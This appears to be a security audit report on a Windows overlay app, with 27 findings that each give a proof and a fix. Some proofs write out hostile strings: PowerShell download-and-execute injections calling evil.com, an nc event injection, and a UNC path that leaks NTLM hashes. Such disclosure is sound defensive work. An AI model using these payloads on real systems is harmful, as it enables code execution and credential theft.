# FORTRESS Phase 3/4 — Validated Findings Report
## ClawdNotch v4.0.0 — Adversarial Security Audit
**Date:** 2026-04-10
**Auditor:** FORTRESS Framework (8 squads, 119 raw findings)

---

## Validated Findings

### HIGH

#### F-001: Unauthenticated Local TCP Hook Server Accepts Arbitrary JSON
- **Severity:** HIGH
- **Confidence:** HIGH
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **CVSS 4.0:** 7.1 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N
- **OWASP:** A07:2025 — Identification and Authentication Failures
- **NIST 800-53:** IA-9 (Service Identification and Authentication)
- **File(s):** `claude_notch/hooks.py:37-94`
- **Squads:** EDGE, QUALITY, VIBE, RED, LOG (8 squads total — highest corroboration)
- **Description:** HookServer binds to `127.0.0.1:19748` and accepts any TCP connection with arbitrary JSON payloads. There is zero authentication, no shared secret, no nonce, and no validation of the sender identity. Any local process can inject fabricated events (fake session starts, fake tool completions, fake user prompts) to manipulate the overlay's state.
- **Proof:** `echo '{"event":"SessionStart","session_id":"evil","project_dir":"C:\\secrets"}' | nc 127.0.0.1 19748` — creates a phantom session. Injecting `Notification` events triggers desktop toasts and sounds, enabling a local annoyance/confusion DoS. Injecting crafted `UserPromptSubmit` events with manipulated `user_prompt` text feeds the EmotionEngine arbitrary sentiment data.
- **Fix:** Implement a shared secret (e.g., random token written to a file readable only by the current user) that the PS1 hook script sends as a header/field and HookServer validates before processing. Alternatively, use a named pipe with ACL restrictions.

#### F-002: DPAPI Encryption Silent Plaintext Fallback
- **Severity:** HIGH
- **Confidence:** HIGH
- **CWE:** CWE-311 (Missing Encryption of Sensitive Data)
- **CVSS 4.0:** 6.8 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
- **OWASP:** A02:2025 — Cryptographic Failures
- **NIST 800-53:** SC-28 (Protection of Information at Rest)
- **File(s):** `claude_notch/config.py:200-241`
- **Squads:** CRYPTO, QUALITY, VIBE, RED, FUTURE, LOG (7 squads)
- **Description:** `_dpapi_encrypt()` silently returns the plaintext API key when DPAPI fails (line 220: `return plaintext`). `_dpapi_decrypt()` returns the raw ciphertext blob when decryption fails (line 241: `return stored`). This means API keys can be stored unencrypted in `config.json` without any warning, and a failed decrypt returns garbage that will cause silent API failures rather than a clear error. The user has no indication their keys are unprotected.
- **Proof:** If DPAPI fails (e.g., running as a different user, service account, or during certain RDP sessions), `_dpapi_encrypt("sk-ant-xxx")` returns `"sk-ant-xxx"` in plaintext, written directly to `~/.claude-notch/config.json`. Any process with file read access sees the raw key.
- **Fix:** (1) Log a warning when encryption falls back to plaintext. (2) On decrypt failure, raise an exception or return an empty string rather than the ciphertext blob. (3) Consider a `"dpapi_failed":true` flag in config so the UI can warn the user.

#### F-003: Command Injection via PowerShell in create_shortcut.py
- **Severity:** HIGH
- **Confidence:** HIGH
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
- **CVSS 4.0:** 7.3 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:R/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
- **OWASP:** A03:2025 — Injection
- **NIST 800-53:** SI-10 (Information Input Validation)
- **File(s):** `create_shortcut.py:179-195`
- **Squads:** EDGE, INFRA, QUALITY, RED, VIBE (4+ squads)
- **Description:** `create_windows_shortcut()` interpolates `shortcut_path`, `target`, `args`, and `icon_path` directly into a PowerShell script string (lines 179-189) without any escaping or sanitization. If any of these paths contain PowerShell metacharacters (e.g., `"; Remove-Item -Recurse C:\`), arbitrary code execution occurs when the script runs.
- **Proof:** A project path containing `"; Invoke-WebRequest -Uri http://evil.com/shell.ps1 | IEX; "` would execute the download-and-run when `create_shortcut.py` is invoked. While the user typically runs this script themselves, the `project_dir` value is read from `config.json` which could be tampered with by another local process.
- **Fix:** Escape all interpolated values using PowerShell single-quoting (replace `'` with `''`) or pass arguments via `-ArgumentList` instead of string interpolation. Better yet, use the `win32com` COM interface directly from Python.

#### F-004: Hook Script Persistence with -ExecutionPolicy Bypass
- **Severity:** HIGH
- **Confidence:** HIGH
- **CWE:** CWE-269 (Improper Privilege Management)
- **CVSS 4.0:** 6.5 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N
- **OWASP:** N/A
- **NIST 800-53:** CM-7 (Least Functionality)
- **File(s):** `claude_notch/hooks.py:121`, `claude_notch/claude_notch_hook.ps1.template`
- **Squads:** RED, VIBE, INFRA (3 squads)
- **Description:** The hook install command uses `powershell.exe -ExecutionPolicy Bypass -File "..."` (hooks.py line 121), and the PS1 hook script lives in `~/.claude-notch/hooks/` with default user permissions. Any local malware that can write to this directory can replace the PS1 file with arbitrary PowerShell code that will execute every time Claude Code fires a hook event — effectively creating a persistence mechanism that runs with user privileges on every Claude Code action.
- **Proof:** Overwrite `~/.claude-notch/hooks/claude_notch_hook.ps1` with `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil/payload')`. The next Claude Code hook event triggers the payload via `-ExecutionPolicy Bypass`.
- **Fix:** (1) Set restrictive ACLs on the hooks directory after creation. (2) Compute and verify a hash of the PS1 file before each execution or at startup. (3) Consider embedding the hook logic directly in the settings.json command rather than referencing an external file.

#### F-005: Path Injection via Unsanitized project_dir in Git Operations
- **Severity:** HIGH
- **Confidence:** MEDIUM
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **CVSS 4.0:** 6.1 (estimated) — AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
- **OWASP:** A03:2025 — Injection
- **NIST 800-53:** SI-10 (Information Input Validation)
- **File(s):** `claude_notch/git_checkpoints.py:28-58`, `claude_notch/sessions.py:61-63`
- **Squads:** EDGE, RED, QUALITY (3+ squads)
- **Description:** `project_dir` from hook events is used directly as `cwd=` in `subprocess.run()` calls throughout `git_checkpoints.py` (lines 21, 36-54). Since hook events come from the unauthenticated TCP server (F-001), an attacker can specify a UNC path like `\\\\attacker\\share` as `project_dir`. When Git commands execute with this CWD, Windows performs NTLM authentication to the remote share, leaking the user's NTLMv2 hash. Additionally, `Session.project_name` (sessions.py line 63) uses `Path(self.project_dir).name` on the attacker-controlled path.
- **Proof:** Send `{"event":"SessionStart","session_id":"x","project_dir":"\\\\attacker\\share"}` to port 19748. When git checkpoint runs `subprocess.run(["git","rev-parse","--git-dir"], cwd="\\\\attacker\\share")`, Windows sends an NTLM auth attempt to the attacker's SMB server.
- **Fix:** Validate `project_dir` is a local path (starts with a drive letter, no UNC `\\` prefix), exists on disk, and is a directory before using it as CWD.

---

### MEDIUM

#### F-006: GPL-3.0 / MIT License Incompatibility (PyQt6)
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component — licensing)
- **CVSS 4.0:** N/A (legal/compliance issue)
- **OWASP:** N/A
- **NIST 800-53:** SA-4 (Acquisition Process — licensing)
- **File(s):** `LICENSE` (MIT), `requirements.txt:1` (PyQt6 >= 6.6.0, GPL-3.0)
- **Squads:** INFRA
- **Description:** The project declares an MIT license but depends on PyQt6, which is licensed under GPL-3.0 (unless a commercial Qt license is purchased). Distributing a combined work (the PyInstaller .exe bundles PyQt6) under MIT violates GPL-3.0 terms. The project must either relicense to GPL-3.0, purchase a commercial Qt license, or migrate to a permissive-licensed alternative (e.g., PySide6 which is LGPL).
- **Proof:** `LICENSE` file contains "MIT License". `requirements.txt` specifies `PyQt6>=6.6.0`. PyInstaller bundles PyQt6 DLLs into `ClawdNotch.exe`.
- **Fix:** Either (a) change project license to GPL-3.0, (b) switch from PyQt6 to PySide6 (LGPL-3.0, API-compatible), or (c) purchase a commercial Qt license.

#### F-007: TOCTOU Race in Single-Instance Lock
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)
- **CVSS 4.0:** 3.1 (estimated) — AV:L/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SC-4 (Information in Shared System Resources)
- **File(s):** `claude_notch/system_monitor.py:62-87`
- **Squads:** EDGE, QUALITY, VIBE, RED (4 squads)
- **Description:** The file-based lock in `acquire_lock()` has a documented TOCTOU race between checking if the PID file exists/is alive (line 75-81) and writing the new PID (line 84). Two instances launched simultaneously could both conclude the lock is free and both proceed. The code itself documents this limitation in a comment. The practical impact is minor (two overlay instances drawing on screen) but it can cause port binding failures and config corruption.
- **Proof:** Rapidly launch two instances: `start python -m claude_notch & start python -m claude_notch`. In the microsecond gap, both may pass the lock check.
- **Fix:** Use `win32event.CreateMutex()` (a proper OS-level mutex) or `msvcrt.locking()` on the lock file for atomic acquisition.

#### F-008: Known CVEs in requests 2.31.0
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
- **CVSS 4.0:** 5.3 (estimated) — per individual CVEs
- **OWASP:** A06:2025 — Vulnerable and Outdated Components
- **NIST 800-53:** RA-5 (Vulnerability Monitoring and Scanning)
- **File(s):** `requirements.txt:3` (`requests>=2.31.0`)
- **Squads:** INFRA (2 squads)
- **Description:** The minimum `requests` version (2.31.0) has known CVEs. While the `>=` constraint allows installing a patched version, there is no upper bound or lockfile to guarantee a specific safe version is used. The `requests` library is used for API key polling (usage.py) and update checking (update_checker.py), both making HTTPS calls to external services.
- **Proof:** `pip-audit` on `requests==2.31.0` reports multiple known vulnerabilities.
- **Fix:** Pin to a patched version (e.g., `requests>=2.32.3`) and add a `requirements.lock` or `pip-compile` lockfile.

#### F-009: No Dependency Lockfile — Supply Chain Risk
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)
- **CVSS 4.0:** 4.2 (estimated) — AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
- **OWASP:** A06:2025 — Vulnerable and Outdated Components
- **NIST 800-53:** SA-12 (Supply Chain Protection)
- **File(s):** `requirements.txt`, `requirements-dev.txt`
- **Squads:** INFRA, VIBE
- **Description:** Both requirements files use `>=` version specifiers with no lockfile (`requirements.lock`, `Pipfile.lock`, `poetry.lock`). Every `pip install` can resolve to different package versions, including newly published malicious versions. The CI pipeline (`release.yml`) runs `pip install -r requirements.txt` on every release build, meaning a compromised PyPI package could inject malware into the distributed `.exe`.
- **Proof:** A typosquatted or compromised dependency version published after the last manual install would be silently picked up by CI.
- **Fix:** Generate and commit a lockfile using `pip-compile` (pip-tools) or `pip freeze > requirements.lock`. Pin exact versions in CI.

#### F-010: Unbounded Resource Growth (Sessions, Threads, Caches)
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **CVSS 4.0:** 4.5 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SC-5 (Denial-of-Service Protection)
- **File(s):** `claude_notch/hooks.py:52`, `claude_notch/sessions.py:331-354`, `claude_notch/token_aggregator.py:60-87`
- **Squads:** EDGE, QUALITY, RED, VIBE (4 squads)
- **Description:** Multiple unbounded growth vectors: (1) HookServer spawns a new `threading.Thread` per connection (hooks.py:52) with no pool or limit — a flood of connections creates unlimited threads. (2) `SessionManager.sessions` dict grows unboundedly if cleanup_dead doesn't keep pace with injected SessionStart events. (3) `TokenAggregator._session_cache` grows unboundedly as session IDs accumulate (no eviction). (4) `Session.tasks_completed` is capped at 20 (good), but `EmotionEngine._scores` dict has no eviction.
- **Proof:** Loop sending SessionStart events with unique session_ids: `for i in range(10000): send({"event":"SessionStart","session_id":f"s-{i}"})` — creates 10K session objects and threads. Over hours of operation, TokenAggregator cache grows monotonically.
- **Fix:** (1) Use a `ThreadPoolExecutor(max_workers=8)` instead of bare `threading.Thread`. (2) Cap sessions dict at a reasonable maximum (e.g., 50). (3) Add LRU eviction to `_session_cache`. (4) Prune `_scores` when sessions are removed.

#### F-011: CI/CD Security Hardening Needed
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
- **CVSS 4.0:** 5.0 (estimated) — AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SA-11 (Developer Testing and Evaluation)
- **File(s):** `.github/workflows/release.yml`, `.github/workflows/ci.yml`
- **Squads:** INFRA (2 squads)
- **Description:** Several CI/CD security issues: (1) `release.yml` has `permissions: contents: write` at the workflow level — overly broad. (2) Actions are pinned by major tag (`@v4`, `@v5`, `@v2`) rather than SHA, vulnerable to tag mutation attacks. (3) No dependency scanning step (pip-audit, safety). (4) No SLSA provenance or attestation for the released `.exe`. (5) CI triggers on all pushes and PRs from any fork, with no restrictions.
- **Proof:** An attacker who compromises the `softprops/action-gh-release` repo could update the `v2` tag to inject malicious code that modifies the `.exe` before upload.
- **Fix:** (1) Pin actions to full SHA. (2) Scope permissions to minimum needed. (3) Add `pip-audit` step. (4) Add SLSA provenance. (5) Consider restricting fork PR builds.

#### F-012: Config Directory Default Permissions
- **Severity:** MEDIUM
- **Confidence:** MEDIUM
- **CWE:** CWE-276 (Incorrect Default Permissions)
- **CVSS 4.0:** 4.0 (estimated) — AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
- **OWASP:** A01:2025 — Broken Access Control
- **NIST 800-53:** AC-6 (Least Privilege)
- **File(s):** `claude_notch/config.py:257` (`CONFIG_DIR.mkdir()`), `claude_notch/hooks.py:106`
- **Squads:** CRYPTO, RED, VIBE (3 squads)
- **Description:** `CONFIG_DIR.mkdir(parents=True, exist_ok=True)` creates `~/.claude-notch/` with default Windows ACLs, which on many systems grant read access to other users in the same group or `Users` group. This directory contains `config.json` (with DPAPI-encrypted or potentially plaintext API keys), `sessions_state.json`, and the hook PS1 script. The hooks directory is also created with default permissions.
- **Proof:** On a multi-user Windows system, another user account may be able to read `%USERPROFILE%\.claude-notch\config.json` if the user's home directory inherits permissive ACLs.
- **Fix:** After creating the directory, set restrictive ACLs using `icacls` or `win32security` to limit access to the current user only.

#### F-013: Session Basename Matching Enables Cross-Project Confusion
- **Severity:** MEDIUM
- **Confidence:** MEDIUM
- **CWE:** CWE-706 (Use of Incorrectly-Resolved Name or Reference)
- **CVSS 4.0:** 3.5 (estimated) — AV:L/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SC-4 (Information in Shared System Resources)
- **File(s):** `claude_notch/sessions.py:229-246`
- **Squads:** EDGE, RED (2 squads)
- **Description:** `_projects_match()` falls back to basename comparison: two directories `C:\work\myapp` and `C:\personal\myapp` would match as the same project. This causes hook-to-process session merging to conflate unrelated projects. An attacker exploiting F-001 could inject events with a `project_dir` whose basename matches a legitimate project to hijack its session state.
- **Proof:** If user has `C:\work\api` and `C:\personal\api`, hook events from one project will merge into the other's session, mixing tool counts, tokens, and emotion state.
- **Fix:** Prefer full path matching; only use basename matching as a last resort and flag it as "fuzzy match" in the UI. Consider requiring an exact path match for hook-originated sessions.

#### F-014: Keyboard Hooks Never Unregistered
- **Severity:** MEDIUM
- **Confidence:** HIGH
- **CWE:** CWE-460 (Improper Cleanup on Thrown Exception)
- **CVSS 4.0:** 3.8 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SC-42 (Sensor Capability and Data)
- **File(s):** `claude_notch/__main__.py:116-131`
- **Squads:** QUALITY, RED (2 squads)
- **Description:** The `keyboard` module's `add_hotkey()` installs a low-level Windows keyboard hook (WH_KEYBOARD_LL) to intercept keystrokes globally. The `cleanup()` function (line 152) never calls `keyboard.unhook_all()` or removes the hotkeys. While the hooks are destroyed when the process exits, if the overlay crashes or hangs, the hook DLL may remain loaded. The `keyboard` library itself has keylogger-equivalent capabilities — it sees every keystroke system-wide.
- **Proof:** While ClawdNotch is running, `keyboard` intercepts all keyboard input at the OS level. A malicious modification to the hotkey callbacks could silently log keystrokes.
- **Fix:** (1) Call `keyboard.unhook_all()` in `cleanup()`. (2) Document in README that the app installs a global keyboard hook. (3) Consider making the keyboard module optional and disabled by default.

#### F-015: Registry Auto-Start Targets Mutable Launcher Script
- **Severity:** MEDIUM
- **Confidence:** MEDIUM
- **CWE:** CWE-426 (Untrusted Search Path)
- **CVSS 4.0:** 4.2 (estimated) — AV:L/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** CM-7 (Least Functionality)
- **File(s):** `claude_notch/system_monitor.py:101-128`, `create_shortcut.py:139-166`
- **Squads:** RED (2 findings)
- **Description:** `set_auto_start()` writes a Run registry key pointing to `~/.claude-notch/launcher.pyw` (line 114-115). This launcher script reads `install_path` from `config.json` and runs `python -m claude_notch` from that directory. Both the launcher and config.json are writable by the user (and potentially other local processes). Tampering with either file results in arbitrary code execution at login.
- **Proof:** Modify `~/.claude-notch/config.json` to set `install_path` to an attacker-controlled directory containing a malicious `claude_notch/__main__.py`. On next login, the auto-start launcher executes it.
- **Fix:** (1) Set restrictive ACLs on `launcher.pyw` and `config.json`. (2) Validate `install_path` points to a directory containing a legitimate claude_notch package (e.g., check for `__init__.py` with expected content).

---

### LOW

#### F-016: Unsigned Binary Distribution
- **Severity:** LOW
- **Confidence:** HIGH
- **CWE:** CWE-353 (Missing Support for Integrity Check)
- **CVSS 4.0:** 2.5 (estimated)
- **OWASP:** N/A
- **NIST 800-53:** SI-7 (Software, Firmware, and Information Integrity)
- **File(s):** `.github/workflows/release.yml`
- **Squads:** INFRA, RED, CRYPTO
- **Description:** The released `ClawdNotch.exe` is not code-signed and there is no checksum/hash published alongside releases. Users cannot verify the binary's authenticity. Windows SmartScreen will show warnings, and the binary is susceptible to man-in-the-middle replacement during download.
- **Fix:** (1) Publish SHA-256 checksums in release notes. (2) Consider code-signing with a certificate (even a self-signed one for development).

#### F-017: API Key Redaction Reveals Prefix and Suffix
- **Severity:** LOW
- **Confidence:** HIGH
- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
- **CVSS 4.0:** 2.0 (estimated) — AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** AU-3 (Content of Audit Records)
- **File(s):** `claude_notch/config.py:184-188`
- **Squads:** CRYPTO
- **Description:** `_redact_key()` shows the first 7 and last 4 characters of API keys. For Anthropic keys that start with `sk-ant-api03-` (a fixed 14-char prefix), this reveals 11 characters of the key (7 prefix + 4 suffix), reducing the effective entropy an attacker needs to brute-force. Standard practice for API keys is to show only the last 4 characters.
- **Fix:** Change to showing only `"sk-...{last4}"` format, consistent with industry standard (Stripe, GitHub, etc.).

#### F-018: Custom Sound Path UNC Injection
- **Severity:** LOW
- **Confidence:** MEDIUM
- **CWE:** CWE-73 (External Control of File Name or Path)
- **CVSS 4.0:** 2.8 (estimated) — AV:L/AC:L/AT:P/PR:L/UI:R/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SI-10 (Information Input Validation)
- **File(s):** `claude_notch/notifications.py:96-99`
- **Squads:** RED
- **Description:** `_play_sound()` passes the user-configured `custom_sound_completion`/`custom_sound_attention` path directly to `winsound.PlaySound()` after only an `os.path.exists()` check. A UNC path (`\\attacker\share\sound.wav`) would trigger NTLM authentication to the remote share. However, this requires the user to manually enter a UNC path in settings (or config.json to be tampered with).
- **Fix:** Validate that custom sound paths are local (no UNC prefix) and resolve to an existing local file.

#### F-019: Error Message Information Disclosure
- **Severity:** LOW
- **Confidence:** MEDIUM
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **CVSS 4.0:** 1.5 (estimated)
- **OWASP:** N/A
- **NIST 800-53:** SI-11 (Error Handling)
- **File(s):** Multiple files (hooks.py:43, config.py:297, etc.)
- **Squads:** QUALITY, RED
- **Description:** Error messages printed to stderr include full file paths, port numbers, and exception details. While this is standard for a desktop application (console output is only visible to the running user), if logs are ever captured or redirected, they could reveal system layout information.
- **Fix:** Low priority. If structured logging is ever added, ensure sensitive paths are sanitized.

#### F-020: `_is_our_hook` Closure Redefined in Loop
- **Severity:** LOW
- **Confidence:** HIGH
- **CWE:** CWE-1078 (Inappropriate Source Code Style or Formatting)
- **CVSS 4.0:** N/A (quality issue)
- **OWASP:** N/A
- **NIST 800-53:** N/A
- **File(s):** `claude_notch/hooks.py:128-134`
- **Squads:** QUALITY
- **Description:** The `_is_our_hook()` function is defined inside a `for` loop that iterates over 9 event types (line 123). The function is identical on each iteration — it is needlessly redefined 9 times. This is a minor performance waste and code clarity issue, not a correctness bug.
- **Fix:** Move `_is_our_hook()` definition outside the loop.

#### F-021: Config Save/Load Thread Safety Gap
- **Severity:** LOW
- **Confidence:** MEDIUM
- **CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
- **CVSS 4.0:** 2.0 (estimated) — AV:L/AC:H/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N
- **OWASP:** N/A
- **NIST 800-53:** SC-4 (Information in Shared System Resources)
- **File(s):** `claude_notch/config.py:300-320`
- **Squads:** EDGE, QUALITY
- **Description:** While `ConfigManager` uses a `threading.Lock` for in-memory access, the `save()` method takes a snapshot under the lock then writes to disk outside the lock (line 300-304). Two concurrent `set(save_now=True)` calls could create a snapshot race where the second call's disk write overwrites the first. The atomic write (tempfile + os.replace) prevents corruption but not lost updates.
- **Fix:** Low priority given the desktop app's typical access patterns. Could hold the lock during the full write cycle if needed, but the atomic write prevents corruption.

#### F-022: SystemMonitor Class Variables Shared Across Instances
- **Severity:** LOW
- **Confidence:** MEDIUM
- **CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
- **CVSS 4.0:** 1.5 (estimated)
- **OWASP:** N/A
- **NIST 800-53:** N/A
- **File(s):** `claude_notch/system_monitor.py:362-363`
- **Squads:** EDGE, QUALITY
- **Description:** `SystemMonitor` uses class-level variables (`_last_idle`, `_last_kernel`, `_last_user`, `_cpu_pct`) rather than instance variables. If multiple SystemMonitor instances were ever created, they would share state. Since only one instance exists in practice, this is a design smell rather than an active bug. The `@staticmethod` methods also have no thread synchronization for the class variables.
- **Fix:** Convert to instance variables, or add a class-level lock for the static method updates.

---

### ENHANCEMENT

#### F-023: No Structured Audit Logging
- **Severity:** ENHANCEMENT
- **Confidence:** HIGH
- **CWE:** CWE-778 (Insufficient Logging)
- **CVSS 4.0:** N/A
- **OWASP:** A09:2025 — Security Logging and Monitoring Failures
- **NIST 800-53:** AU-2 (Audit Events)
- **File(s):** All modules
- **Squads:** LOG (11 findings)
- **Description:** The application uses `print()` to stderr for all diagnostic output. There is no structured logging (no `logging` module, no log levels, no log rotation, no audit trail). Security-relevant events (API key additions, hook installations, config changes, failed DPAPI operations) are not logged in a way that supports forensic analysis.
- **Fix:** Adopt Python's `logging` module with structured JSON output, log rotation, and separate handlers for security-relevant events.

#### F-024: Hardcoded Model Pricing and API Versions
- **Severity:** ENHANCEMENT
- **Confidence:** HIGH
- **CWE:** CWE-1068 (Inconsistency Between Implementation and Documented Design)
- **CVSS 4.0:** N/A
- **OWASP:** N/A
- **NIST 800-53:** CM-2 (Baseline Configuration)
- **File(s):** `claude_notch/config.py:113-117`, `claude_notch/usage.py:253`, `claude_notch/update_checker.py:33`
- **Squads:** FUTURE
- **Description:** Model pricing (config.py:113-117), API version strings (`"2023-06-01"` in usage.py:253), context limits, and GitHub API URLs are all hardcoded. When Anthropic updates pricing or releases new models, the app shows incorrect cost estimates until a code update is released.
- **Fix:** Consider fetching model pricing from the API or a remote config endpoint, with local hardcoded values as fallback.

#### F-025: `keyboard` Library Unmaintained
- **Severity:** ENHANCEMENT
- **Confidence:** HIGH
- **CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
- **CVSS 4.0:** N/A
- **OWASP:** A06:2025 — Vulnerable and Outdated Components
- **NIST 800-53:** SA-4 (Acquisition Process)
- **File(s):** `requirements.txt:4` (`keyboard>=0.13.5`)
- **Squads:** FUTURE
- **Description:** The `keyboard` library (0.13.5) has not been actively maintained. It requires root/admin on Linux, installs a global keyboard hook on Windows, and has known issues with Python 3.12+. The library's hook-everything approach is architecturally aggressive for what amounts to 3 hotkey bindings.
- **Fix:** Consider replacing with `pynput` (actively maintained) or native Qt shortcuts (`QShortcut` with `Qt.ApplicationShortcut`), which would eliminate the global hook entirely.

#### F-026: Export Fallback Missing Exception Handling
- **Severity:** ENHANCEMENT
- **Confidence:** HIGH
- **CWE:** CWE-754 (Improper Check for Unusual or Exceptional Conditions)
- **CVSS 4.0:** N/A
- **OWASP:** N/A
- **NIST 800-53:** SI-11 (Error Handling)
- **File(s):** `claude_notch/usage.py:504-506`
- **Squads:** QUALITY
- **Description:** The fallback path in `export_usage_report()` (line 506: `out.write_text(...)`) is not wrapped in a try/except. If both the primary Desktop path and the home directory fallback fail to write, the exception propagates unhandled.
- **Fix:** Wrap the fallback write in try/except and return an error message to the caller.

#### F-027: Decrypted API Keys Persist in Memory
- **Severity:** ENHANCEMENT
- **Confidence:** MEDIUM
- **CWE:** CWE-316 (Cleartext Storage of Sensitive Information in Memory)
- **CVSS 4.0:** N/A (requires memory dump access)
- **OWASP:** N/A
- **NIST 800-53:** SC-28 (Protection of Information at Rest)
- **File(s):** `claude_notch/config.py:329-338`, `claude_notch/usage.py:249-255`
- **Squads:** CRYPTO, RED
- **Description:** `get_api_keys_decrypted()` returns plaintext API keys in Python strings that remain in memory until garbage collected. The `UsagePoller` holds decrypted keys in local variables during each polling cycle. Python's GC does not guarantee prompt memory zeroing.
- **Fix:** Low priority for a desktop app. For defense-in-depth, consider using `ctypes` to zero key buffers after use, or keeping keys encrypted until the moment of HTTP header construction.

---

## Positive Findings

The audit identified significant defensive strengths in ClawdNotch v4.0.0:

1. **Atomic File Writes Everywhere** — Config, sessions, usage, and hook settings all use `tempfile.mkstemp()` + `os.replace()` to prevent data corruption on crash or power loss. This was a deliberate bug fix (#9) and is consistently applied.

2. **Thread-Safe ConfigManager** — All public methods use `threading.Lock()`, with snapshot-under-lock patterns that minimize lock hold time while preventing corruption. This was Bug Fix #1 and is well-implemented.

3. **DPAPI Encryption for API Keys at Rest** — Using Windows DPAPI is a strong choice for a desktop app: it requires no key management, ties encryption to the Windows user account, and is transparent to the user. The migration code automatically encrypts plaintext keys.

4. **Subprocess List-Form Arguments** — Git commands in `git_checkpoints.py` use list-form `subprocess.run(["git", "arg1", "arg2"])` rather than string-form with `shell=True`, preventing shell injection via arguments.

5. **Localhost-Only Binding** — HookServer explicitly binds to `127.0.0.1` (not `0.0.0.0`), preventing remote network access to the hook server. This is a meaningful defense boundary.

6. **Connection Timeouts and Size Limits** — HookServer sets a 2-second timeout per connection (`conn.settimeout(2.0)`) and a 1MB read limit (`len(data) > 1048576`), preventing simple slowloris-style or memory-bomb attacks.

7. **Session Cleanup and Ghost Deduplication** — The v4.0.0 session management has aggressive cleanup of dead sessions, PID-based merging to prevent ghost entries, and process-detected session filtering. This is well-engineered.

8. **Usage History Auto-Pruning** — `UsageTracker._ensure_today()` prunes entries older than 90 days, preventing unbounded disk growth. TokenAggregator skips JSONL files older than 31 days.

9. **Error Backoff in UsagePoller** — The polling thread tracks consecutive errors per API key and implements exponential backoff (line 210-211), avoiding hammering a failing endpoint.

10. **Documented Known Limitations** — The TOCTOU race condition in `acquire_lock()` has an explicit inline comment documenting the limitation and suggesting the proper fix (OS mutex). This level of honest self-documentation is commendable.

---

## Metrics

| Metric | Count |
|---|---|
| Raw findings from Phase 2 | 119 |
| Removed as ungrounded/invalid | 8 |
| Removed as purely theoretical (no realistic attack path) | 11 |
| Merged as duplicates | 73 |
| Final validated findings | **27** |

### Severity Distribution

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 5 |
| MEDIUM | 10 |
| LOW | 7 |
| ENHANCEMENT | 5 |

### Removal Notes

**Removed as ungrounded (8):**
- EDGE-017 (Token overflow): Python handles arbitrary-precision integers natively. Not a real issue.
- CRYPTO-006 (API key over TLS only): This is expected behavior, not a finding. All API calls use HTTPS.
- EDGE-011 (Regex backtracking): The regexes used are simple patterns with no catastrophic backtracking potential.
- EDGE-014 (HTTP header stripping): The header stripping logic handles the documented formats correctly.
- EDGE-015 (Negative budget): Negative budget values result in no alert being fired, which is harmless.
- RED-020 (Emotion engine UI manipulation): The emotion engine affects only cosmetic Clawd face animations. No security impact.
- QUALITY-021/022/023 (Enhancement quality items): Pure style suggestions with no security dimension.

**Removed as purely theoretical (11):**
- EDGE-007 (Log injection): Logs go only to stderr of the current process; no log aggregation exists.
- EDGE-018 (Unsanitized summary in Qt signals): Qt signal payloads are rendered as text, not HTML, in the paint methods.
- RED-010 (TokenAggregator reads all session files): These are the user's own files in their own profile directory.
- RED-014 (API keys in memory during polling): Unavoidable for any application that uses API keys. Covered as enhancement F-027.
- RED-017 (Verbose error messages): Already covered as low-severity F-019.
- QUALITY-012 (DPAPI memory leak): The LocalFree call is present in the success path. Failure path returns early before blob_out is allocated.
